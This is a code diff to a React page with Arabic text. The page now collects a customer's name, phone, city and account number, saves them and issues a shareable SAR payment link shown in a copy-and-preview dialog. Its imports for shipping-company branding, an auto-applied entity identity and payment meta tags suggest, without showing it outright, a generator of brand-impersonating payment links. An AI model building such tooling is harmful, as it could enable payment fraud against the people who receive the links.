@@ -5,24 +5,40 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { MapPin, CreditCard, Building2, User, Phone, Hash, ArrowLeft } from "lucide-react";
+import { MapPin, CreditCard, Building2, User, Phone, Hash, ArrowLeft, RefreshCw, CheckCircle, Copy, ExternalLink } from "lucide-react";
 import BrandedTopBar from "@/components/BrandedTopBar";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useCreateLink } from "@/hooks/useSupabase";
+import { generatePaymentLink } from "@/utils/paymentLinks";
+import { useToast } from "@/hooks/use-toast";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const LocalPaymentPage = () => {
   const navigate = useNavigate();
+  const { toast } = useToast();
+  const createLink = useCreateLink();
   const { entity, identity } = useAutoApplyIdentity();
   
   const [customerName, setCustomerName] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [serviceType, setServiceType] = useState("");
   const [accountNumber, setAccountNumber] = useState("");
-  const [amount, setAmount] = useState("");
+  const [amount, setAmount] = useState("500");
   const [city, setCity] = useState("");
+  const [showSuccess, setShowSuccess] = useState(false);
+  const [createdLink, setCreatedLink] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   const serviceKey = "local_payment";
   const branding = getServiceBranding(serviceKey);
@@ -42,9 +58,41 @@ const LocalPaymentPage = () => {
     "الرياض", "جدة", "مكة المكرمة", "المدينة المنورة", "الدمام", "الخبر", "تبوك", "أبها", "الطائف", "بريدة"
   ];
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    // Handle payment submission
+    setIsSubmitting(true);
+
+    try {
+      const selectedService = serviceTypes.find(s => s.id === serviceType);
+      const link = await createLink.mutateAsync({
+        type: "local_payment",
+        country_code: "SA",
+        payload: {
+          service_key: serviceKey,
+          service_name: selectedService?.nameAr || 'السداد المحلي',
+          customerInfo: { fullName: customerName, phoneNumber: customerPhone, city, accountNumber },
+          cod_amount: parseFloat(amount),
+          service_type: serviceType,
+          selectedCountry: "SA"
+        },
+      });
+
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: 'local_payment',
+        country: 'SA',
+        amount: parseFloat(amount),
+        currency: 'SAR',
+        type: 'local_payment'
+      });
+      setCreatedLink(paymentUrl);
+      setShowSuccess(true);
+      toast({ title: "تم إنشاء الرابط بنجاح" });
+    } catch (error) {
+      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -238,15 +286,19 @@ const LocalPaymentPage = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-lg py-7 text-white font-bold shadow-2xl"
+                  disabled={isSubmitting || !customerName || !customerPhone || !serviceType || !accountNumber || !amount || !city}
+                  className="w-full text-lg py-7 text-white font-bold shadow-2xl transition-all active:scale-95"
                   style={{
                     background: `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
                     fontFamily: identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
                   }}
-                  disabled={!customerName || !customerPhone || !serviceType || !accountNumber || !amount || !city}
                 >
-                  <span className="ml-2">التالي - إتمام السداد</span>
-                  <ArrowLeft className="w-5 h-5 mr-2" />
+                  {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : (
+                    <>
+                      <span className="ml-2">إصدار رابط السداد</span>
+                      <ArrowLeft className="w-5 h-5 mr-2" />
+                    </>
+                  )}
                 </Button>
 
                 <p className="text-xs text-center text-muted-foreground mt-4">
@@ -257,6 +309,37 @@ const LocalPaymentPage = () => {
           </div>
         </div>
       </div>
+
+      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
+        <AlertDialogContent className="max-w-[90%] rounded-[2.5rem] border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
+           <div className="p-10 text-center space-y-6">
+              <div className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-2">
+                <div className="w-16 h-16 bg-green-600 rounded-full flex items-center justify-center animate-bounce shadow-lg">
+                  <RefreshCw className="w-8 h-8 text-white" />
+                </div>
+              </div>
+              <div className="space-y-1">
+                <AlertDialogTitle className="text-3xl font-black text-slate-900">رابط السداد جاهز!</AlertDialogTitle>
+                <AlertDialogDescription className="font-bold text-slate-500">تم إنشاء رابط دفع آمن للسداد المحلي بنجاح</AlertDialogDescription>
+              </div>
+
+              <div className="bg-slate-50 p-4 rounded-2xl border-2 border-dashed border-slate-200 break-all font-mono text-xs font-bold text-slate-400">
+                {createdLink}
+              </div>
+
+              <div className="flex gap-4">
+                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); setCopied(true); setTimeout(() => setCopied(false), 2000); toast({ title: "تم النسخ" }); }} className="flex-1 h-16 rounded-2xl font-black bg-slate-900 text-white gap-2">
+                   {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
+                   {copied ? "تم النسخ" : "نسخ الرابط"}
+                 </Button>
+                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-16 rounded-2xl font-black border-2 border-slate-200 gap-2 text-slate-700">
+                   <ExternalLink className="w-5 h-5" /> معاينة
+                 </Button>
+              </div>
+              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-slate-300">إغلاق</Button>
+           </div>
+        </AlertDialogContent>
+      </AlertDialog>
     </>
   );
 };
